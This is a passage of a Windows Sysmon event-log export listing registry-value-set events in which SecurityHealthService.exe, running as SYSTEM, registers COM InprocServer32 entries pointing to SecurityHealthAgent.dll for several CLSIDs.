TargetObject: HKCR\CLSID\{C8DFF91D-B243-4797-BAE6-C461B65EDED3}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.271
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{E476E4C0-409C-43CD-BBC0-5905B4138494}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.271
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{E476E4C0-409C-43CD-BBC0-5905B4138494}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.269
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{88866959-07B0-4ED8-8EF5-54BC7443D28C}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.269
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{88866959-07B0-4ED8-8EF5-54BC7443D28C}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.267
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{5FFAB5C8-9A36-4B65-9FC6-FB69F451F99C}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.265
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{5FFAB5C8-9A36-4B65-9FC6-FB69F451F99C}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.263
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{2EF44DE8-80C9-42D9-8541-F40EF0862FA3}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.263
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{2EF44DE8-80C9-42D9-8541-F40EF0862FA3}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.261
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{3CD3CA1E-2232-4BBF-A733-18B700409DA0}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.261
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{3CD3CA1E-2232-4BBF-A733-18B700409DA0}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
